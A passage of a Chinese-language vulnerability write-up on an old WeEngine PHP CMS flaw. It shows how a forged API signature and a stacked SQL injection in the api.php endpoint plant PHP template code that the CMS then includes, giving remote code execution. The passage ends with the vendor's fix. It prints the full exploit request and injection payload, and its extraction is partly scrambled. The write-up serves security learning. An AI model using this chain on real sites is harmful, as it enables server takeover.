14
15
16
17
18
其中 timestamp 是时间戳、 nonce 是5 位随机字符串、 signature 是由 sha1加密后的
$signString ，⽽ $signString 是由 token 、 timestamp 、 nonce 组成。可以看到，是
硬编码⽣成，因此可以通过 print_r($_W) 得到 token 值，如下：
      $data = $this->account->encryptMsg($postStr);
      $array = array('encrypt_type' => 'aes', 'timestamp' => 
$timestamp, 'nonce' => $nonce, 'signature' => $signString, 
'msg_signature' => $data[0], 'msg' => $data[1]);
    } else {
      $data = array('', '');
      $array = array('encrypt_type' => '', 'timestamp' => $timestamp, 
'nonce' => $nonce, 'signature' => $signString, 'msg_signature' => 
$data[0], 'msg' => $data[1]);
    }
    exit(json_encode($array));
  }
19
20
21
22
23
24
25
26
所以可以利⽤以下代码⽣成：
9
10
11
12
13
14
15
1622388248 | SATNv | d886b80d868b6fb1038c77f1f26ae5f2891a3b22
1
最终在个⼈中⼼可以看到：
但是这种⽅式⽐较鸡肋和费事，⼀是解密⾮常难，⼆是如果直接添加账号也会留下很多痕
迹，三是即是登录后，还要拿 shell。
那么有没有⼀步到位的⽅法？
0x05 从 SQL 到 RCE
/app/source/home/page.ctrl.php ⽂件：
⾸先判断 $do 的类型，如果不是 getnum 和 addnum 时，进⼊ template_page 函数。
跟进 /app/common/template.func.php  111⾏：
$do = in_array($do, $dos) ? $do : 'index';
$id = intval($_GPC['id']);
if($do == 'getnum'){
  $goodnum = pdo_get('site_page', array('id' => $id), 
array('goodnum'));
  message(error('0', array('goodnum' => $goodnum['goodnum'])), '', 
'ajax');
} elseif($do == 'addnum'){
  if(!isset($_GPC['__havegood']) || (!empty($_GPC['__havegood']) && 
!in_array($id, $_GPC['__havegood']))) {
    $goodnum = pdo_get('site_page', array('id' => $id), 
array('goodnum'));
    if(!empty($goodnum)){
      $updatesql = pdo_update('site_page', array('goodnum' => 
$goodnum['goodnum'] + 1), array('id' => $id));
      if(!empty($updatesql)) {
        isetcookie('__havegood['.$id.']', $id, 86400*30*12);
        message(error('0', ''), '', 'ajax');
      }else { 
        message(error('1', ''), '', 'ajax');
      }
    }   
  }
} else {
  $footer_off = true;
  template_page($id);
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
function template_page($id, $flag = TEMPLATE_DISPLAY) {
  global $_W;
  $page = pdo_fetch("SELECT * FROM ".tablename('site_page')." WHERE id 
= :id LIMIT 1", array(':id' => $id));
  if (empty($page)) {
    return error(1, 'Error: Page is not found');
  }
  if (empty($page['html'])) {
    return '';
  }
  $page['html'] = str_replace(array(' $page['description'], 'title' => 
$page['title'], 'imgUrl' => tomedia($page['params']['0']['params']
['thumb']));;
  $compile = IA_ROOT . "/data/tpl/app/{$id}.{$_W['template']}.tpl.php";
  $path = dirname($compile);
  if (!is_dir($path)) {
    load()->func('file');
    mkdirs($path);
  }
  $content = template_parse($page['html']);
  if (!empty($page['params'][0]['params']['bgColor'])) {
    $content .= '';
  }
  $GLOBALS['bottom_menu'] = $page['params'][0]['property'][0]['params']
['bottom_menu'];
  file_put_contents($compile, $content);
  switch ($flag) {
    case TEMPLATE_DISPLAY:
    default:
      extract($GLOBALS, EXTR_SKIP);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
⾸先根据 id 从 ims_site_page 数据表⾥读取页⾯信息，然后过滤掉敏感信息，最后通过
file_put_contents 写⼊到 $compile ，然后在 switch 中被包含 include
$compile; 。
因此我们可以利⽤ SQL 注⼊，向 ims_site_page 表中插⼊⼀句话数据。如下：
      template('common/header');
      include $compile;
      template('common/footer');
      break;
    case TEMPLATE_FETCH:
      extract($GLOBALS, EXTR_SKIP);
      ob_clean();
      ob_start();
      include $compile;
      $contents = ob_get_contents();
      ob_clean();
      return $contents;
      break;
    case TEMPLATE_INCLUDEPATH:
      return $compile;
      break;
  }
}
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
POST /wq/new/api.php?
id=1&timestamp=1622388248&nonce=SATNv&signature=d886b80d868b6fb1038c77f
1f26ae5f2891a3b22 HTTP/1.1
Host: 192.168.49.47
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 
Safari/537.36
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/
webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
1
2
3
4
5
6
7
这⾥的模板内容PHP 代码可以参考：PHP 语句
然后根据官⽹⽂档路由介绍：
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7
Connection: close
Content-Length: 440
one
two
1348831806
qr
test
text
hello
test';insert into 
ims_site_page(id,uniacid,multiid,title,description,params,html,multipag
e,type,status,createtime,goodnum) values(1,1,1,'4','5','[{"params":
{"thumb":""}}]','{if phpinfo())?>//}','8','9','10','11','12');
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
则有：
成功执⾏代码
0x06 漏洞修复
这个漏洞主要就是由 SQL 注⼊引起的，因此修复 SQL 注⼊后，后续的包含也没法继续利⽤
了。
官⽅修复⽅式如下：
改成了微擎⾃带的参数化查询。
0x07 写在最后
由于这个是⽼洞了，所以在搭建上坑点不少，但是漏洞很好理解。
最后感谢续师傅的指导，周末还继续带我学习（膜~
0x08 参考
https://www.kancloud.cn/donknap/we7/134649
https://www.kancloud.cn/hl449006540/we-engine-datasheet/1103542
https://wiki.w7.cc/chapter/35?id=507
https://gitee.com/we7coreteam/pros/commit/1f5ffb82836f7602f3acbaf9e93e9aa087c93579)